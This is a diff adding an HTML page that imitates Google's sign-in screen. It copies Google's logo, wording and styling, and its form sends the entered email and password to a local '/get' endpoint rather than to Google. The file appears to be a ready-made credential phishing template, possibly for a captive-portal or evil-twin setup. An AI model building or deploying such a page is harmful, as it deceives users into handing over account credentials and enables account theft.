@@ -1,0 +1,362 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: 'Google Sans', Roboto, Arial, sans-serif;
+    }
+    html, body {
+      overflow: hidden;
+    }
+
+    body {
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      background-color: #202124;
+    }
+
+    .login-container {
+      background-color: #0F0F10;
+      padding: 50px 60px 46px;
+      border-radius: 20px;
+      box-shadow: none;
+      width: 900px;
+      max-width: 90%;
+      min-height: 400px;
+      display: flex;
+      flex-direction: row;
+    }
+
+    .left-section {
+      flex: 1;
+      padding-right: 48px;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .right-section {
+      flex: 1;
+      padding-left: 48px;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+    }
+
+    #logo {
+      display: block;
+      margin: 0 0 16px 0;
+      width: 52px;
+      height: 52px;
+    }
+
+    h1 {
+      text-align: left;
+      margin-bottom: 12px;
+      font-size: 36px;
+      font-weight: 400;
+      color: #e8eaed;
+      letter-spacing: -0.5px;
+    }
+
+    h2 {
+      text-align: left;
+      margin-bottom: 0;
+      font-size: 16px;
+      font-weight: 400;
+      color: #bdc1c6;
+      line-height: 1.5;
+    }
+
+    .input-wrapper {
+      position: relative;
+      margin-bottom: 16px;
+    }
+
+    .g-input {
+      display: block;
+      width: 100%;
+      height: 56px;
+      padding: 20px 15px 6px;
+      border: 1px solid #5f6368;
+      border-radius: 4px;
+      background-color: transparent;
+      color: #e8eaed;
+      font-size: 16px;
+      font-family: Roboto, Arial, sans-serif;
+      transition: border-color 0.2s, box-shadow 0.2s;
+    }
+
+    .g-input:focus {
+      outline: none;
+      border-color: #8ab4f8;
+      box-shadow: inset 0 0 0 1px #8ab4f8;
+    }
+
+    .g-input:hover:not(:focus) {
+      border-color: #e8eaed;
+    }
+
+    .floating-label {
+      position: absolute;
+      left: 16px;
+      top: 50%;
+      transform: translateY(-50%);
+      color: #9aa0a6;
+      font-size: 16px;
+      pointer-events: none;
+      transition: all 0.2s ease;
+      background: transparent;
+      padding: 0;
+    }
+
+    .g-input:focus + .floating-label,
+    .g-input:not(:placeholder-shown) + .floating-label {
+      top: 8px;
+      transform: translateY(0);
+      font-size: 12px;
+      color: #8ab4f8;
+      background: transparent;
+      padding: 0 4px;
+      left: 12px;
+    }
+
+    .g-input:not(:focus):not(:placeholder-shown) + .floating-label {
+      color: #9aa0a6;
+    }
+
+    .forgot-link {
+      display: inline-block;
+      color: #8ab4f8;
+      font-size: 14px;
+      font-weight: 500;
+      text-decoration: none;
+      margin-bottom: 20px;
+    }
+
+    .forgot-link:hover {
+      text-decoration: underline;
+    }
+
+    .info-text {
+      color: #9aa0a6;
+      font-size: 14px;
+      line-height: 1.5;
+      margin-bottom: 32px;
+    }
+
+    .info-text a {
+      color: #8ab4f8;
+      text-decoration: none;
+      font-weight: 500;
+    }
+
+    .info-text a:hover {
+      text-decoration: underline;
+    }
+
+    .button-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-top: auto;
+    }
+
+    .create-link {
+      color: #8ab4f8;
+      font-size: 14px;
+      font-weight: 500;
+      text-decoration: none;
+      padding: 10px 8px;
+      margin-left: -8px;
+      border-radius: 4px;
+    }
+
+    .create-link:hover {
+      background-color: rgba(138, 180, 248, 0.04);
+    }
+
+    .gbtn-primary {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      min-width: 88px;
+      height: 40px;
+      padding: 0 24px;
+      border: none;
+      border-radius: 4px;
+      background-color: #8ab4f8;
+      color: #202124;
+      font-size: 14px;
+      font-weight: 500;
+      font-family: 'Google Sans', Roboto, Arial, sans-serif;
+      letter-spacing: 0.25px;
+      cursor: pointer;
+      transition: background-color 0.2s, box-shadow 0.2s;
+    }
+
+    .gbtn-primary:hover {
+      background-color: #aecbfa;
+      box-shadow: 0 1px 3px 1px rgba(0,0,0,0.15), 0 1px 2px rgba(0,0,0,0.3);
+    }
+
+    .gbtn-primary:active {
+      background-color: #93b9f8;
+    }
+
+    .footer {
+      width: 840px;
+      max-width: 90%;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 16px 8px;
+      margin-top: 16px;
+    }
+
+    .language-select {
+      background: transparent;
+      border: none;
+      color: #9aa0a6;
+      font-size: 12px;
+      font-family: 'Google Sans', Roboto, Arial, sans-serif;
+      cursor: pointer;
+      padding: 8px;
+      border-radius: 4px;
+      appearance: none;
+      display: flex;
+      align-items: center;
+      gap: 4px;
+    }
+
+    .language-select:hover {
+      background-color: rgba(255,255,255,0.04);
+    }
+
+    .footer-links {
+      display: flex;
+      gap: 24px;
+    }
+
+    .footer-links a {
+      color: #9aa0a6;
+      font-size: 12px;
+      text-decoration: none;
+      padding: 8px;
+      border-radius: 4px;
+    }
+
+    .footer-links a:hover {
+      background-color: rgba(255,255,255,0.04);
+    }
+
+    @media (max-width: 840px) {
+      .login-container {
+        flex-direction: column;
+        width: 450px;
+        padding: 40px 40px 36px;
+      }
+
+      .left-section {
+        padding-right: 0;
+        margin-bottom: 32px;
+      }
+
+      .right-section {
+        padding-left: 0;
+      }
+
+      .footer {
+        width: 450px;
+      }
+
+      h1 {
+        font-size: 24px;
+      }
+    }
+
+    @media (max-width: 480px) {
+      body {
+        background-color: #303134;
+      }
+
+      .login-container {
+        width: 100%;
+        max-width: 100%;
+        border-radius: 0;
+        padding: 24px;
+        min-height: 100vh;
+      }
+
+      .footer {
+        width: 100%;
+        flex-direction: column;
+        gap: 16px;
+        align-items: flex-start;
+      }
+
+      .button-row {
+        flex-direction: column-reverse;
+        gap: 16px;
+        align-items: stretch;
+      }
+
+      .gbtn-primary {
+        width: 100%;
+      }
+
+      .create-link {
+        text-align: center;
+      }
+    }
+  </style>
+  <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+</head>
+<body>
+<div class="login-container">
+  <div class="left-section">
+    <div id="logo">
+      <svg viewBox="0 0 48 48" width="52" height="52" xmlns="http://www.w3.org/2000/svg">
+        <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
+        <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
+        <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
+        <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
+      </svg>
+    </div>
+    <h1>Sign in</h1>
+    <h2>with your Google Account. This account will be available to other Google apps in your browser.</h2>
+  </div>
+  <div class="right-section">
+    <form action="/get" id="email-form-step">
+      <div class="input-wrapper">
+        <input name="email" type="text" class="g-input" placeholder=" " required>
+        <label class="floating-label">Email or Phone</label>
+      </div>
+      <div class="input-wrapper">
+        <input name="password" type="password" class="g-input" placeholder=" " required>
+        <label class="floating-label">Enter your password</label>
+      </div>
+      <a href="#" class="forgot-link">Forgot email?</a>
+      <p class="info-text">Not your device? Use Guest mode to sign in privately. <a href="#">Learn how to use Guest mode</a></p>
+      <div class="button-row">
+        <a href="#" class="create-link">Create account</a>
+        <button class="gbtn-primary" type="submit">Next</button>
+      </div>
+    </form>
+  </div>
+</div>
+<div class="footer">
+  <div class="language-select">English (United States) ▾</div>
+  <div class="footer-links">
+    <a href="#">Help</a>
+    <a href="#">Privacy</a>
+    <a href="#">Terms</a>
+  </div>
+</div>
+</body>
+</html>
